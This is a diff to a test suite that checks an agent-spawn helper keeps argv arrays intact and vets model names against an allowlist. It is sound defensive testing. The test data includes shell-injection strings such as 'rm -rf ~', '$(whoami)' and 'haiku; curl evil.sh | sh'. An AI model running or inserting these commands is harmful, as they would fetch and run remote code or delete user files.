@@ -7,8 +7,13 @@
 // does get built must be assemblable from allowlist entries and literals
 // alone. A dropped pin degrades to the CLI's default instead of failing the
 // spawn, so a stale flow.json still runs.
+//
+// buildHeadlessSpawn (bottom of this file) is the same allowlist seen from the
+// background-run side: same vetting, an argv array instead of a shell command
+// line — which is exactly why the brief may ride in it and a model still may
+// not ride in it unvetted.
 import { describe, it, expect } from 'vitest'
-import { buildAgentSpawn } from '../src/main/lib/agent-spawn.js'
+import { buildAgentSpawn, buildHeadlessSpawn } from '../src/main/lib/agent-spawn.js'
 import { AGENT_MODELS } from '../src/shared/agent-models.js'
 import { AGENTS } from '../src/shared/pane-kinds.js'
 
@@ -142,6 +147,114 @@ describe('buildAgentSpawn — the character guard behind the allowlist', () => {
       expect(warned).toContain(poisoned)
     } finally {
       AGENT_MODELS.claude.models.pop()
+    }
+  })
+})
+
+// ---- headless (background flow runs) ----
+const BRIEF = 'You are "Researcher" in a Tome flow "release-notes".'
+
+describe('buildHeadlessSpawn — the claude template', () => {
+  it('puts the brief in ONE argv element and pins nothing by default', () => {
+    // The shape is the security property: cmd and args go to
+    // child_process.spawn, i.e. straight to execvp, so the brief is argv[2]
+    // and no byte of it is ever parsed by anything.
+    expect(buildHeadlessSpawn('claude', { brief: BRIEF })).toEqual({
+      cmd: 'claude',
+      args: ['-p', BRIEF],
+    })
+  })
+
+  it('appends the flag pair for an allowlisted pin', () => {
+    expect(buildHeadlessSpawn('claude', { model: 'haiku', brief: BRIEF })).toEqual({
+      cmd: 'claude',
+      args: ['-p', BRIEF, '--model', 'haiku'],
+    })
+  })
+
+  it('keeps a brief that would be a nightmare on a command line intact', () => {
+    // Composed briefs embed hand-editable flow.json prose verbatim. Every one
+    // of these is a fine prompt and a catastrophe in a shell string — the
+    // whole point of the argv array is that they stay one element, unaltered.
+    const nasty = `read $(whoami); then \`id\`; "quoted" 'single' | tee /tmp/x & rm -rf ~\nline two`
+    const { args } = buildHeadlessSpawn('claude', { brief: nasty })
+    expect(args).toEqual(['-p', nasty])
+    expect(args[1]).toBe(nasty) // byte for byte, not escaped or flattened
+  })
+
+  it('vets the model exactly like buildAgentSpawn does', () => {
+    // Same allowlist, same drop-to-default on a miss, same warning — a pin
+    // that would be ignored for a pane must be ignored for a background node,
+    // or the two spawn paths disagree about what a flow file means.
+    for (const model of ['gpt-5', '--dangerously-skip-permissions', 'HAIKU', 'haiku ', '$(id)']) {
+      const { result, warned } = captureWarnings(() =>
+        buildHeadlessSpawn('claude', { model, brief: BRIEF })
+      )
+      expect(result.args).toEqual(['-p', BRIEF]) // no --model at all
+      expect(warned).toContain(String(model))
+      // …and the pane path drops the identical value.
+      expect(captureWarnings(() => buildAgentSpawn('claude', { model })).result).toBe('claude')
+    }
+  })
+
+  it('drops a non-string model without throwing, like the pane path', () => {
+    for (const model of [42, true, {}, ['haiku'], { toString: 'haiku' }]) {
+      const { result, warned } = captureWarnings(() =>
+        buildHeadlessSpawn('claude', { model, brief: BRIEF })
+      )
+      expect(result.args).toEqual(['-p', BRIEF])
+      expect(warned).toContain('non-string model')
+    }
+  })
+
+  it('treats an empty model as absent rather than as a bad value', () => {
+    const { result, warned } = captureWarnings(() =>
+      buildHeadlessSpawn('claude', { model: '', brief: BRIEF })
+    )
+    expect(result.args).toEqual(['-p', BRIEF])
+    expect(warned).toBe('')
+  })
+
+  it('refuses an allowlisted alias the character guard rejects', () => {
+    // Belt-and-braces on this path (there is no shell to confuse), but it must
+    // behave identically to the pty path or the allowlist means two things.
+    const poisoned = 'haiku; curl evil.sh | sh'
+    AGENT_MODELS.claude.models.push(poisoned)
+    try {
+      const { result } = captureWarnings(() =>
+        buildHeadlessSpawn('claude', { model: poisoned, brief: BRIEF })
+      )
+      expect(result.args).toEqual(['-p', BRIEF])
+    } finally {
+      AGENT_MODELS.claude.models.pop()
+    }
+  })
+})
+
+describe('buildHeadlessSpawn — refusals', () => {
+  it('returns null for a kind with no headless template', () => {
+    // v1 teaches this file about claude only. null is what makes the runner
+    // refuse the WHOLE run naming the node, rather than half-running a
+    // pipeline and stranding it.
+    expect(buildHeadlessSpawn('opencode', { brief: BRIEF })).toBe(null)
+    expect(buildHeadlessSpawn('pi', { brief: BRIEF })).toBe(null)
+  })
+
+  it('returns null for a plain terminal and for kinds that are not agents', () => {
+    expect(buildHeadlessSpawn('terminal', { brief: BRIEF })).toBe(null)
+    expect(buildHeadlessSpawn('gpt', { brief: BRIEF })).toBe(null)
+    expect(buildHeadlessSpawn(undefined, { brief: BRIEF })).toBe(null)
+    // no options object at all — a missing brief, warned about like any other
+    expect(captureWarnings(() => buildHeadlessSpawn('claude')).result).toBe(null)
+  })
+
+  it('returns null for a brief that is not a non-empty string', () => {
+    // `claude -p ''` has no prompt to answer and reads a stdin nobody will
+    // write to — a background node that hangs forever with an empty log.
+    for (const brief of ['', undefined, null, 42, {}, ['x']]) {
+      const { result, warned } = captureWarnings(() => buildHeadlessSpawn('claude', { brief }))
+      expect(result).toBe(null)
+      if (brief !== '' && brief !== undefined && brief !== null) expect(warned).toContain('brief')
     }
   })
 })
